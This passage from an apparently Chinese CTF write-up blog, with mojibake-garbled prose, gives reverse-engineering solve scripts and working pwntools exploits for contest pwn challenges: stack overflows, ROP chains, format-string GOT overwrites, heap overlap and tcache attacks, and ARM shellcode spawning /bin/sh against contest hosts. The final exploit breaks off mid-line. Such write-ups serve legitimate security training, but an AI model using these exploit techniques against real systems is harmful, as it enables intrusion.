2.re2\n\næ‰‹åŠ¨è„±å£³ï¼Œç”¨x32dbgå‡ºäº†ä¸€ç‚¹é—®é¢˜ï¼Œè„±å®Œæ²¡æ³•è¿è¡Œ\n\n![img](https://i.loli.net/2021/01/26/wlLAHOzmhu98bVU.png)\n\nåŠ å¯†é€»è¾‘å¾ˆå¤æ‚ï¼Œç›´æ¥è¿›å…¥æœ€åçš„æ¯”è¾ƒå‡½æ•°\n\n![image-20210126171357756](https://i.loli.net/2021/01/26/XYox4deqPVvG67S.png)\n\nå¾ˆæ˜æ˜¾åŠ å¯†åæ•°æ®å’Œå†…å­˜æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆåªè¦çŸ¥é“åŠ å¯†é€»è¾‘å°±å¯ä»¥äº†\n\nè¿™é‡Œé€‰æ‹©åŠ¨è°ƒï¼Œç”±äºå½“æ—¶è„±å£³æ²¡è„±å¥½ï¼Œäºæ˜¯ä¹æˆ‘ç›´æ¥ç”¨å¸¦å£³çš„ç¨‹åºè°ƒè¯•\n\nå†…å­˜æ•°æ®ï¼š\n\n![image-20210126171702705](https://i.loli.net/2021/01/26/cVaC9lQueoh7jwq.png)\n\nè¾“å…¥32ä¸ª'a'ä¹‹åçš„åŠ å¯†æ•°æ®ï¼š\n\n![image-20210126171810196](https://i.loli.net/2021/01/26/U4xIrdisn7CAuXb.png)\n\n![image-20210126171932577](https://i.loli.net/2021/01/26/g8DtIY9FvKQOicG.png)\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\n\ns = [0x1A, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x14, 0x00, \n  0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x1A, 0x00, 0x00, 0x00, \n  0x0D, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x22, 0x00, \n  0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, \n  0x2F, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x06, 0x00, \n  0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, \n  0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x00, \n  0x00, 0x00, 0x69, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, \n  0x06, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x69, 0x00, \n  0x00, 0x00, 0x35, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00, \n  0x3D, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x20, 0x00, \n  0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, \n  0x78, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00]\nfor i in range(0,len(s),4):\n    print(chr(s[i]^89),end = \"\")\n#CUMTCTF{Have_fuN_F0R_H0liday!!!}\n```\n\n## 3.re5--game\n\næŒºæœ‰æ„æ€çš„é¢˜ç›®\n\né•¿æ—¶é—´ä¸åšé€†å‘ï¼Œè¿èŠ±æŒ‡ä»¤éƒ½å¿˜äº†ï¼Œå°±é•¿è¿™æ ·ï¼Œçœ‹åˆ°jnzä¸€ä¸ªåœ°å€+2ï¼Œåº”è¯¥å¾ˆå®¹æ˜“æƒ³åˆ°çš„æˆ‘ä¸¢\n\n![image-20210130162118817](https://i.loli.net/2021/01/30/kmsGt1xu4yEQi2T.png)\n\näºæ˜¯å»äº†èŠ±ä¹‹åï¼ŒIDAæ¢å¤æ­£å¸¸\n\né€†å‘é¢˜å…¨æ˜¯å»äº†ç¬¦å·è¡¨çš„æ¯”è¾ƒéš¾å—ï¼Œé€»è¾‘ä¸æ˜¯å¾ˆå¤æ‚ï¼Œå¤§ä½“æ˜¯è¿™æ ·çš„ï¼š\n\nä½ çš„è¾“å…¥ä¸¤ä¸¤ä¸€ç»„ï¼Œç›¸å½“äºä¸€ä¸ªåæ ‡ï¼Œç¨‹åºä¼šæ ¹æ®ä½ çš„åæ ‡å»ä¸€ä¸ª10*10çš„mapé‡Œæ‰¾ï¼Œå–å‡ºç›¸åº”çš„å­—æ¯æ‹¼æ¥ï¼Œæ¯5ä¸ªå­—æ¯ä¸º1ç»„ï¼Œç„¶ååŠ ä¸Š'@'è¿›è¡Œåˆ†å‰²ï¼Œå°†è¿™äº›å­—ç¬¦æ”¾å…¥ä¸€ä¸ªæŒ‡å®šå†…å­˜ï¼Œåœ¨ä¸»å‡½æ•°ä¸­ä¼šé‡æ–°å°†è¿™äº›å­—ç¬¦æ”¾å…¥æ ˆä¸­è¿›è¡Œæ“ä½œï¼Œæœ€åçš„checkå‡½æ•°ç®—æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªcheckä¼šæ¯”è¾ƒæ¯5ä¸ªä¸€ç»„çš„å­—ç¬¦ä¸²ä¸ç¬¬å‡ ä¸ªåç§»çš„å†…å­˜æ•°æ®ç›¸åŒï¼Œä¼šè®°ä¸‹ä¸‹æ ‡ï¼Œå¹¶åœ¨å¦ä¸€ä¸ªå­—å…¸ä¸­æŒ‰è¿™ä¸ªä¸‹æ ‡å–å‡ºå­—æ¯ï¼Œç›´åˆ°æ‰€æœ‰æ¯”è¾ƒç»“æŸï¼Œå°†æ ¹æ®ä½ è¾“å…¥å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸å­—ç¬¦ä¸²`johnnysilverhand`è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™è¾“å‡ºflag\n\nè¿™é¢˜æœ‰å¤šç§è§£æ³•ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯æ¨ªåæ ‡æ’å–0ï¼Œå³å¯ç»•è¿‡åˆ¤æ–­\n\nè„šæœ¬å¦‚ä¸‹:\n\n```python\nqu='abcdefghijklmnopqrstuvwxyz!.?*'\nchk='johnnysilverhand'\ndic['CFUMT','CFUTM','CTFMU','CTFUM','CTMFU','FCMTU','FCMUT','FCUTM','FMCTU','FTMUC','FTUCM','FTUMC','FUCMT','FUTCM','FUTMC','MCFTU','MUCFT','MUCTF','MUTCF','TUCFM','TUCMF','TUFMC','TUMCF','TUMFC','UCFMT','UCMFT','UCMTF','UCTFM','UTMCF','UTMFC']\n#print(len(qu))\ndic2=[0x41,0x5A,0x54,0x55,0x59,0x50,0x46,0x51,0x41,0x5A,\n0x55,0x49,0x56,0x5A,0x56,0x43,0x52,0x41,0x41,0x49,\n0x44,0x41,0x5A,0x4D,0x56,0x49,0x41,0x43,0x5A,0x44,\n0x48,0x5A,0x48,0x5A,0x48,0x56,0x49,0x48,0x41,0x49,\n0x48,0x44,0x4D,0x46,0x55,0x54,0x55,0x54,0x44,0x49,\n0x4D,0x55,0x43,0x4D,0x5A,0x46,0x54,0x48,0x44,0x48,\n0x56,0x44,0x56,0x42,0x44,0x48,0x56,0x4D,0x41,0x43,\n0x5A,0x46,0x55,0x54,0x42,0x44,0x43,0x52,0x42,0x44,\n0x46,0x41,0x42,0x42,0x43,0x44,0x52,0x49,0x52,0x49,\n0x43,0x42,0x54,0x44,0x46,0x49,0x56,0x44,0x42,0x52]\nidx = []\nfor ch in chk:\n    for i in range(30):\n        if(qu[i]==ch):\n            idx.append(i)\n            \n# print(len(dic2))\nfor i in range(len(idx)):\n    print (\"\")\n    print (dic[idx[i]],end = \" \")\n    for j in range(5):\n        for k in range(len(dic2)):\n            if (dic[idx[i]][j]==chr(dic2[k])):\n                print (\"0\"+chr(k+0x30),end = ' ')\n                break\n```\n\n![image-20210130163403626](https://i.loli.net/2021/01/30/Ls1eNtrViFbQdYO.png)\n\nå¯¹äº†è®°å½•ä¸€ä¸ªå¥‡æ€ªçš„å‘ç‚¹\n\nä¸€å¼€å§‹æˆ‘å¹¶ä¸çŸ¥é“è¿™é¢˜è¦ncï¼Œæ‰€ä»¥æˆ‘å°±åœ¨æœ¬åœ°æµ‹è¯•ï¼Œå½“æˆ‘è¾“å…¥ç­”æ¡ˆä¹‹åå­—ç¬¦ä¸²æ²¡é—®é¢˜\n\nè¿™æ˜¯åœ¨æ ˆä¸­çš„è‡ªå·±ç”Ÿæˆçš„å­—ç¬¦ä¸²:\n\n![image-20210130163935188](https://i.loli.net/2021/01/30/lE5SVuOhgMpf3oT.png)\n\nè¿™æ˜¯åœ¨å†…å­˜ä¸­çš„checkå­—ç¬¦ä¸²:\n\n![image-20210130164118228](https://i.loli.net/2021/01/30/LxD2OnCKPYVB1tp.png)\n\nä½†æ˜¯æœ€åè°ƒç”¨strcmpæ—¶ï¼Œrdiå´åªå–äº†å‰8ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²\n\n![image-20210130164233618](https://i.loli.net/2021/01/30/nAXbH7a3mYtQdOf.png)\n\næ‰€ä»¥æœ€åæ¯”è¾ƒå°±æ²¡æœ‰é€šè¿‡ï¼ŒæŒºç¦»è°±çš„ï¼Œå­˜ç–‘\n\n# 0x05 å°ç»“\n\nå¤ªèœäº†...æŠ½ç©ºå¤ç°ä¸€ä¸‹å…¶ä»–é¢˜","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Dec_Match 2020","url":"/2021/01/01/Dec_Match/","content":"\n# å‰è¨€\n\n2020æœ€åä¸€ä¸ªæœˆï¼Œåˆ’æ°´çš„ä¸€ä¸ªæœˆï¼Œæ²¡ä»€ä¹ˆæ¯”èµ›ï¼Œä¹Ÿæ²¡ä»€ä¹ˆäº‹æƒ…ï¼Œ17çº§è€ƒç ”ç»“æŸäº†ï¼Œæˆ‘ä»¬ä¹Ÿè¯¥å‡†å¤‡äº†\n\næ²¡å•¥å¥½å†™çš„ï¼Œè€è§„çŸ©ï¼Œæ”¾ä¸Šæ ¡èµ›é¢˜è§£\n\n~~(æœ€åä¸€æ³¢ç‹™å‡»ä¼¼ä¹æŠŠæ¯”èµ›æ•´ä¹±å¥—äº†ï¼Œç¤¾å·¥å¤§å†›å¼€å§‹ç–¯ç‹‚py......à®‡à¯°à®‡)~~\n\n![](https://files.catbox.moe/yo7jqt.png)\n\n## 0x00 pwn1\n\nstrlen() \\x00æˆªæ–­ï¼Œç»•è¿‡strcmpï¼Œè¦†ç›–æ‰å˜é‡ä¸º123\n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn1\")\n# p = elf.process()\np = remote('219.219.61.234','10000')\np.send('\\x00'+'a'*6+p32(123)+p32(0))\np.interactive()\n```\n\n## 0x01 pwn2\n\nå’Œpwn1åŒç†ï¼Œåˆ©ç”¨ä¸¤æ¬¡ROPæ„é€ æ¥getshell \n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn2\")\n# p = elf.process()\n# context.log_level = 'debug'\n# libc = ELF('libc.so.6')\nlibc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')\np = remote('219.219.61.234','10001')\np.send('\\x00'+'a'*6+p32(12345)+p32(0))\npayload = 'a'*0x6c + 'b'*4 + p32(elf.plt['puts']) +p32(0x8048753) + p32(elf.got['puts'])\np.recvuntil(\"haha\\n\")\np.send(payload)\nlibc_base = u32(p.recvuntil(\"\\xf7\").ljust(4,'\\x00')) - libc.sym['puts']\ninfo(hex(libc_base))\nsys = libc_base  + libc.sym['system']\nbinsh = libc_base + 0x15910b\npayload = 'a'*0x6c + 'b'*4 + p32(sys)+'a'*4+ p32(binsh)\np.send(payload)\np.interactive()\n```\n\n## 0x02 pwn3\n\né€šè¿‡æ„é€ ï¼Œå°†ç»“æ„ä½“å†…çš„putså‡½æ•°æŒ‡é’ˆæ”¹ä¸ºsystem\n\n```python\nfrom pwn import *\nelf=ELF('./pwn3')\n# p = elf.process()\np =remote('219.219.61.234',10002)\nlibc = ELF('libc.so.6')\ndef add(size,con):\n    p.sendlineafter('Your choice :','1')\n    p.sendlineafter('Note size :',str(size))\n    p.sendafter('Content :',con)\n\ndef delete(idx):\n    p.sendlineafter('Your choice :','2')\n    p.sendlineafter('Index:',str(idx))\n\ndef show(idx):\n    p.sendlineafter('Your choice :','3')\n    p.sendlineafter('Index :',str(idx))\nbackdoor=0x08048986\ninfo(hex(backdoor))\nadd(16,'ld1ng')\nadd(16,'ld1ng')\ndelete(0)\ndelete(1)\nadd(8,p32(backdoor))\nshow(0)\n\np.interactive() \n```\n\n## 0x03 pwn4\n\nåœ¨å­æ´‹å¸ˆå‚…çš„å¸®åŠ©ä¸‹ç”¨matlabè§£å‡ºå¯†é’¥ï¼Œç„¶åæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²libcåŸºå€ï¼Œåœ°å€ä»»æ„å†™ï¼Œå¯ä»¥ä¿®æ”¹putsçš„gotè¡¨\n\n```python\nfrom pwn import *\nelf=ELF('./pwn4')\n# context.log_level = 'debug'\ncontext(arch='amd64',os='linux')\n# p = elf.process()\np =remote('219.219.61.234',10003)\nlibc = ELF('libc-2.23.so')\npasswd = '3xpL0r3R'\nonegadget = [0x45226,0x4527a,0xf0364,0xf1207]\nputs_got = elf.got['printf']\np.sendlineafter(\"important secret\",'ld1ng')\np.sendlineafter(\">>\",str(3))\np.sendlineafter(\"please inputs password >>\",passwd)\np.recv()\np.recvuntil(\"secret\\n\")\np.recvuntil(\"secret\\n\")\n# gdb.attach(p)\n# p.sendlineafter(\"please your secret\",\"%45$p\")\np.sendline(\"%77$p\")\nlibc_base = int(p.recv(15),16) - 0x20840\ninfo(hex(libc_base))\none_gadget = libc_base + onegadget[0]\npayload = fmtstr_payload(6,{puts_got:one_gadget})\np.sendline(payload)\np.interactive()\n```\n\n## 0x04 pwn5\n\nfree unsortedbinæ³„éœ²libcåŸºå€ï¼Œé€šè¿‡å•å­—èŠ‚æº¢å‡ºï¼Œæ¥æ„é€ overlapï¼Œé€šè¿‡å°±è¯¥ä¸‹ä¸ªå †å—çš„structå˜é‡åœ°å€æ¥ä¿®æ”¹gotè¡¨ï¼Œä»è€Œgetshellï¼Œ(æ‰“è¿œç¨‹æ—¶å‡ºäº†ç‚¹é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡show freeçš„gotè¡¨æ¥æ³„éœ²libcç‰ˆæœ¬)\n\n```python\nfrom pwn import *\nelf = ELF('./pwn5')\n# p = elf.process()\np = remote('219.219.61.234','10004')\nlibc = ELF('libc-2.23.so')\n# libc = ELF('libc.so.6')\n# context.log_level = 'debug'\nog = [0x4f3d5,0x4f432,0x10a41c,0x45226,0x4527a,0xf0364,0xf1207]\ndef add(size,con):\n\tp.sendlineafter('Your choice :','1')\n\tp.sendlineafter('Size:',str(size))\n\tp.sendafter('Content:',con)\n\ndef edit(idx,con):\n    p.sendlineafter('Your choice :','2')\n    p.sendlineafter('Index:',str(idx))\n    p.sendafter('Content:',con)\n\ndef delete(idx):\n\tp.sendlineafter('Your choice :','4')\n\tp.sendlineafter('Index:',str(idx))\n\ndef show(idx):\n\tp.sendlineafter('Your choice :','3')\n\tp.sendlineafter('Index:',str(idx))\n# buf = 0x2177158\nadd(0x90,\"aaa\") #0\nadd(0x48,\"bbb\") #1\ndelete(0)\nadd(0x90,'\\x78')\nshow(0)\np.recvuntil(\"Content: \")\nlibc_base = u64(p.recvuntil('\\x7f').ljust(8,'\\x00')) -88 -0x10 -libc.sym['__malloc_hook'] #- 0x3c4b78\ninfo(hex(libc_base))\n# add(0x68,\"ccc\")\n# add(0x68,\"ddd\")\n# edit(1,'a'*0x48+'\\x91')\n# delete(2)\nadd(0x18,'aaaa')#2\nadd(0x10,'bbbb')#3\nadd(0x10,'cccc')#4\nadd(0x10,'/bin/sh')#5\nedit(2,'a'*0x18+'\\x81')\ndelete(3)\n\npayload = 'd'*0x40+ p64(8) + p64(elf.got['free'])\nadd(0x70,payload)#3\nshow(4)\np.recvuntil(\"Content: \")\nfree_addr = u64(p.recvuntil('\\x7f').ljust(8,'\\x00'))\ninfo(hex(free_addr))\n# libc_base = free_addr - libc.sym['free']\nsystem_addr = libc_base + libc.sym['system']\none = libc_base + og[6]\ninfo(hex(system_addr))\nedit(4,p64(system_addr))\n# edit(4,p64(one))\ndelete(5)\n\np.interactive()\n```\n\n## 0x05 pwn6\n\nuafå’Œå•å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œä¸pwn5ç±»ä¼¼çš„æ„é€ ï¼Œé€šè¿‡gotè¡¨çš„ä¿®æ”¹æ¥getshell\n\n```python\nfrom pwn import *\nelf = ELF('./pwn6')\n# p = elf.process()\np = remote('219.219.61.234','10005')\n# libc = ELF('libc-2.23.so')\nlibc = ELF('libc.so.6')\n# context.log_level = 'debug'\ndef enter():\n    p.sendlineafter(\"important secret\",\"ld1ng\")\n    p.sendlineafter(\">>\",\"2\")\n\ndef add(idx,size,con):\n    p.sendlineafter('Your Choice>>','1')\n    p.sendlineafter('index>>',str(idx))\n    p.sendlineafter('size>>',str(size))\n    p.sendlineafter('name>>',con)\n\ndef edit(idx,con):\n    p.sendlineafter('Your Choice>>','3')\n    p.sendlineafter('index>>',str(idx))\n    p.sendafter('name>>',con)\n\ndef delete(idx):\n    p.sendlineafter('Your Choice>>','2')\n    p.sendlineafter('index>>',str(idx))\n\ndef show(idx):\n    p.sendlineafter('Your Choice>>','5')\n    p.sendlineafter('index>>',str(idx))\nenter()\nadd(0,128,\"aaa\")\nadd(1,128,\"bbb\")\ndelete(0)\nshow(0)\nlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 -libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nsys = libc_base + libc.sym[\"system\"]\ninfo(hex(sys))\nadd(2,0x88,\"ccc\")\nadd(3,0x88,\"ddd\")\nadd(4,0x88,\"eee\")\nedit(0,'a'*0x88 + '\\xd1')\ndelete(1)\nadd(5,0xc8,\"fff\")\nedit(5,p64(0)*3+p64(0x21)+p64(0)*16+p64(0)+p64(0x21)+p64(0x88)+p64(0x602080)+p64(0))\np.sendline(\"ls\")\n# add(6,0x80,\"ld1ng\")\nedit(3,p64(sys))\np.sendline(\"ls\")\np.sendline(\"cat flag\")\n# delete(4)\n\np.interactive()\n```\n\n## 0x06 pwn7\n\nubuntu18.4ï¼Œåˆ©ç”¨tcacheæœºåˆ¶ï¼Œæ„é€ ä¸€ä¸ªåˆå¹¶çš„å¤§unsortedå †å—ï¼Œåˆ©ç”¨å•å­—èŠ‚æº¢å‡º(off by none)ï¼Œä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeä½ï¼Œåˆ©ç”¨unlinkæœºåˆ¶ä¼šé€ æˆä¸­é—´å—é‡å ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜ä¼šå†ç”³è¯·åˆ°ä¸­é—´å—ï¼Œé€ æˆä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å†…å­˜åŒºåŸŸï¼Œè¿™æ ·ä¿®æ”¹fdæŒ‡é’ˆå°†free_hookæ”¹ä¸ºonegadgetå³å¯\n\n```python\nfrom pwn import *\nelf = ELF('./pwn7')\n# p = elf.process()\np = remote('219.219.61.234','10050')\n# libc = ELF('libc-2.27.so')\nlibc = ELF('libc.so')\n# context.log_level = 'debug'\nog = [0x4f3d5,0x4f432,0x10a41c,0x4f365,0x4f3c2,0x10a45c]\ndef add(size,con):\n\tp.sendlineafter('> ','1')\n\tp.sendlineafter('> ',str(size))\n\tp.sendlineafter('> ',con)\ndef delete(idx):\n\tp.sendlineafter('> ','2')\n\tp.sendlineafter('> ',str(idx))\ndef show(idx):\n\tp.sendlineafter('> ','3')\n\tp.sendlineafter('> ',str(idx))\nfor i in range(10):\n\tadd(0x10,'a')\nfor i in range(3,10):\n\tdelete(i)\nfor i in range(3):\n\tdelete(i)\nfor i in range(10):\n\tadd(0x10,'a') #unsortdebin -> 7,8,9\nfor i in range(6):\n\tdelete(i)\ndelete(8) \ndelete(7) \nadd(0xf8,'ld1ng') #idx9 -> 0\ndelete(6)\ndelete(9)\nfor i in range(8):\n\tadd(0x10,'b')\nshow(0)\nlibc_base = u64(p.recv(6).ljust(8,'\\x00')) - 96 - 0x3ebc40\ninfo('libc_base : '+hex(libc_base))\nfree_hook = libc_base + libc.sym['__free_hook']\none_gadget = libc_base +og[1] #0x4f3c2 0x4f365  0x10a45c\n# sys = libc_base + libc.sym[\"system\"]\ninfo('free_hook : '+hex(free_hook))\ninfo('one_gadget : '+hex(one_gadget))\nadd(0x10,'d')\ndelete(1)\ndelete(0)\ndelete(9)\nadd(0x20,p64(free_hook))\nadd(0x20,'e')\nadd(0x20,p64(one_gadget))\ndelete(3)\np.sendline(\"cat flag\")\np.interactive()\n```\n\n# 0x08 åä¸ºXCTF ARM pwn1\n\nç¬¬ä¸€æ¬¡åšarm pwnï¼Œå…ˆæ­å»ºå¥½armç¯å¢ƒï¼Œä½†æ˜¯æ²¡æœ‰æå®šç¬¦å·è¡¨ï¼ŒåŠ¨è°ƒä¹Ÿå¾ˆéº»çƒ¦ï¼Œå­˜ç–‘\n\né¢˜ç›®æ˜¯ä¸€é“å¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éœ€è¦å­¦ä¹ æŒæ¡armçš„æ±‡ç¼–çŸ¥è¯†\n\nçœ‹ä¸€ä¸‹æºç¨‹åº\n\n```assembly\nmain                                    ; DATA XREF: _start+20â†‘o\n.text:000104A0                                         ; .text:off_103DCâ†‘o\n.text:000104A0\n.text:000104A0 buf             = -0x104\n.text:000104A0\n.text:000104A0                 PUSH            {R11,LR}\n.text:000104A4                 ADD             R11, SP, #4\n.text:000104A8                 SUB             SP, SP, #0x100\n.text:000104AC                 LDR             R2, =_GLOBAL_OFFSET_TABLE_ ; PIC mode\n.text:000104B0                 NOP\n.text:000104B4                 LDR             R3, =(stdout_ptr - 0x21000)\n.text:000104B8                 LDR             R3, [R2,R3] ; stdout\n.text:000104BC                 LDR             R0, [R3] ; stream\n.text:000104C0                 MOV             R3, #0  ; n\n.text:000104C4                 MOV             R2, #2  ; modes\n.text:000104C8                 MOV             R1, #0  ; buf\n.text:000104CC                 BL              setvbuf\n.text:000104D0                 LDR             R3, =(aInput - 0x104DC) ; \"input: \"\n.text:000104D4                 ADD             R3, PC, R3 ; \"input: \"\n.text:000104D8                 MOV             R0, R3  ; format\n.text:000104DC                 BL              printf\n.text:000104E0                 SUB             R3, R11, #-buf\n.text:000104E4                 MOV             R2, #0x300 ; nbytes\n.text:000104E8                 MOV             R1, R3  ; buf\n.text:000104EC                 MOV             R0, #0  ; fd\n.text:000104F0                 BL              read\n.text:000104F4                 MOV             R3, #0\n.text:000104F8                 MOV             R0, R3\n.text:000104FC                 SUB             SP, R11, #4\n.text:00010500                 POP             {R11,PC}\n```\n\nç¨‹åºå¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥å°è¯•ç”¨ropæ¥æ”»å‡»\n\né¦–å…ˆå¯»æ‰¾ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„gadget\n\n```\n0x00056b7c : pop {r0, r4, pc}\n0x00010500 : pop {fp, pc}\n0x00010348 : pop {r3, pc}\n0x00010498 : pop {r4, pc}\n```\n\næ€è·¯æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ³„éœ²libcåŸºå€ï¼Œé€šè¿‡printfå°†read_gotæ³„éœ²\n\nä½†æ˜¯æ²¡æœ‰å•ç‹¬çš„pop r0çš„gadgetï¼Œæ‰€ä»¥å°è¯•pop {r3, pc}ï¼Œç„¶åè¿”å›åˆ°0x000104D8\n\n![image-20201231152256196](https://i.loli.net/2020/12/31/vN2eJ7aZS9cXqon.png)\n\nè¿™æ ·å°±å¯ä»¥æ‰“å°å‡ºlibcåŸºå€ï¼Œç„¶åå°±å¡ä½äº†ï¼Œä¼¼ä¹æ²¡åŠæ³•æ§åˆ¶pcäº†\n\nä½†æ˜¯ç¥å¥‡çš„æ˜¯ï¼Œé€šè¿‡åŠ¨è°ƒå‘ç°libcåŸºå€å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œç„¶åå°è¯•è®°ä¸‹å›ºå®šçš„libcåŸºå€ï¼Œæ„é€ payload\n\npayload='a'\\*0x104+p32(pop_0_4)+p32(bin_sh)\\*2+p32(system)å³å¯\n\nè‡³äºä¸ºä»€ä¹ˆlibcåŸºå€ä¸å˜ï¼ŒæŸ¥äº†å¾ˆå¤šèµ„æ–™å¹¶æ²¡æœ‰æ”¶è·ï¼Œ\n\nä½†å¬A1GXå¸ˆå‚…è¯´ï¼Œè¿è¡Œçš„qemuçš„è™šæ‹Ÿæ¡†æ¶å†…å¯èƒ½æ˜¯æ²¡æœ‰nxä¿æŠ¤æˆ–è€…alsrï¼Œå­˜ç–‘\n\n### exp\n\n```python\nfrom pwn import *\ncontext(arch='arm',os='linux',log_level='debug')\nelf=ELF('./bin')\n# libc=ELF('./libc-2.31.so')\nlibc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')\ndef gdb_attach():\n    os.system('gnome-terminal -x sh -c \"gdb-multiarch ./bin -ex \\'target remote 127.0.0.1:1234\\'\"')\n# io = process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\nio = process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\n# io = remote(\"139.159.210.220\",9999)\nread_got=elf.got['read']\nprintf_got=elf.got['printf']\nprintf_plt = elf.plt['printf']\n# print hex(libc.sym['read'])\nprint hex(read_got)\n# payload = '\\x00'*0x104+p32(0x00010348)+p32(read_got)+p32(0x000104D8)\n\n# io.sendafter(\"input: \",payload)\n# libc_base = u32(io.recv(4)) - libc.sym['read']\n# info(hex(libc_base))\nlibc_base = 0xf66cc000\nsystem=libc_base+libc.sym['system']\nbin_sh=libc_base+0xca574\npop_0_4=libc_base+0x00056b7c\n# gdb.attach(proc.pidof(io)[0])\npayload='a'*0x104+p32(pop_0_4)+p32(bin_sh)*2+p32(system)\nio.send(payload)\n# io.sendline(\"ls\")\nio.interactive()\n```\n\nè™½ç„¶æ˜¾ç¤ºå¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æ˜¯æˆ‘å‘ç°å„ä¸ªæ®µéƒ½æ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„(å¤ªç–‘æƒ‘äº†!)ï¼Œæ‰€ä»¥å¯ä»¥å‘bssæ®µå†™å…¥shellcode\n\n```python\nfrom pwn import *\ncontext(arch='arm',os='linux',log_level='debug')\n\n# io = process([\"qemu-arm\",\"-g\",\"1234\",\"-L\",\".\",\"./bin\"])\nio = process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabihf\",\"./bin\"])\n# io = remote(\"139.159.210.220\",9999)\nshellcode =  b'\\x02\\x20\\x42\\xe0\\x1c\\x30\\x8f\\xe2'\nshellcode += b'\\x04\\x30\\x8d\\xe5\\x08\\x20\\x8d\\xe5'\nshellcode += b'\\x13\\x02\\xa0\\xe1\\x07\\x20\\xc3\\xe5'\nshellcode += b'\\x04\\x30\\x8f\\xe2\\x04\\x10\\x8d\\xe2'\nshellcode += b'\\x01\\x20\\xc3\\xe5\\x0b\\x0b\\x90\\xef'\nshellcode += b'/bin/sh;'\n\npop_r3_pc = 0x00010348\ndata_addr = 0x00021030\nread_addr = 0x000104E8\n\npayload = b'a'*256+p32(data_addr)+p32(pop_r3_pc)+p32(data_addr)+p32(read_addr)\nio.sendafter(\"input: \",payload)\nio.sendline(p32(data_addr+4)+shellcode)\nio.interactive()\n```\n\n# 0x09 å¹´åº¦å°ç»“~\n\nå¤§å®¶æ–°å¹´å¿«ä¹ï¼","tags":["CTF"],"categories":["PWN"]},{"title":"Nov_Match 2020","url":"/2020/11/30/Nov_Match/","content":"\n# 0x00 å‰è¨€\n\n11- 4 å»äº†å—äº¬å‚åŠ å…¨å›½å·¥ä¸šäº’è”ç½‘å®‰å…¨å¤§èµ› ~~(Final)~~ï¼Œå­¦ç”Ÿç»„ç¬¬ååï¼Œ2ç­‰å¥–è¿˜æ˜¯æŒºæ»¡æ„çš„\n\n11-4æ™š ä¸ºäº†ä¹°ç³•ç‚¹é”™è¿‡äº†é«˜é“...\n\n11-10 è€ƒç®—æ³•ï¼Œä¸¤å¤©å¤ä¹ ç®—æ³•ï¼ŒåŠå¤©å¤ä¹ ä»£ç ï¼Œéƒ½è¿‡äº†\n\n11-14çš„ä¸Šæµ·èµ›å‡ºäº†ç‚¹(æ„å¤–)ï¼Œä¸è¿‡è¿˜ä¸é”™å¸®hxdmå†²åˆ°ç¬¬ä¸ƒå\n\n# 0x01 æ¹–æ¹˜æ¯2020 pwn_printf\n\n> \n>\n> emmmæ¹–æ¹˜æ¯pyå¤§èµ›ï¼Œæœ€åä¸€å°æ—¶çš„ç‹‚æ¬¢ï¼Œä¸æƒ³è¯´ä»€ä¹ˆäº†ï¼ŒçœŸçš„å†²ä¸åŠ¨...\n>\n> \n\nåŸGoogleCTFçš„é€†å‘é¢˜ï¼Œsprintfæ„é€ çš„è™šæ‹Ÿæœºï¼Œæ”¹æˆäº†pwné¢˜ï¼Œå­˜åœ¨éé¢„æœŸ\n\nå½“ç¬¬ä¹ä¸ªå‚æ•°ä¸º0x20ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œrop\n\n![image-20201104205621829](https://i.loli.net/2020/11/04/gEoi728fbGqB9ny.png)\n\nrbpè¦†ç›–ä¸º0x603500ï¼Œé€šè¿‡æ”¹å˜rsiï¼Œæ¥è¿›è¡Œæ ˆè¿ç§»\n\n## exp\n\n```python\nfrom pwn import *\nelf = ELF(\"./pwn_printf\")\np = elf.process()\nlibc = ELF(\"./pwn_printf\").libc\n#p = 